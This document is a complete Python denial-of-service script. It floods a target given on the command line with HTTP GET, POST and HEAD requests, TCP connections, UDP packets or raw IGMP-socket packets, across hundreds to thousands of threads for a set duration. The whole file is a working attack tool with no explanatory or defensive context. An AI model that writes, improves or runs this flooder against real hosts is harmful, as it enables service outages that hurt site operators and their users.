import requests
import threading
import socket
from time import sleep
from sys import argv
from random import randbytes





def raw(url):
    while True :
        if STATUS == None : continue
        if STATUS == False : break
        try:
            requests.get(url)
        except:pass


def rand(url):
    while True :
        if STATUS == None : continue
        if STATUS == False : break
        try:
            requests.post(url,data=randbytes(1000))
        except:pass

def head(url):
    while True :
        if STATUS == None : continue
        if STATUS == False : break
        try:
            requests.head(url)
        except:pass

def udp(ip,port):
    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    while True:
        if STATUS == None : continue
        if STATUS == False : break
        try :
            sock.sendto(randbytes(1000),(ip,port))
        except : continue


def tcp(ip,port):
    while True:
        if STATUS == None : continue
        if STATUS == False : break
        try :
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(randbytes(1000))
        except : continue

def flood(ip,port):
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    while True:
        if STATUS == None : continue
        if STATUS == False : break
        try :
            sock.sendto(randbytes(1000), (ip, int(port)))
        except : continue

        


def countdown(s):
    global STATUS
    STATUS = True
    for i in range(s,0,-1):
        sleep(1)
    STATUS = False



if __name__ == '__main__':
    method = argv[1]
    host = argv[2]
    port = int(argv[3])
    t = int(argv[4])
    threading.Thread(target=countdown,args=(t,)).start()
    if method == 'get' :
        for i in range(2000):threading.Thread(target=raw,args=(host,)).start()
    elif method == 'post' :
        for i in range(2000):threading.Thread(target=rand,args=(host,)).start()
    elif method == 'head' :
        for i in range(2000):threading.Thread(target=head,args=(host,)).start()
    elif method == 'tcp' :
        for i in range(500):threading.Thread(target=tcp,args=(host,port)).start()
    elif method == 'udp' :
        for i in range(75):threading.Thread(target=udp,args=(host,port)).start()
    elif method == 'flood' :
        for i in range(75):threading.Thread(target=flood,args=(host,port)).start()
    else:exit("Unknow method")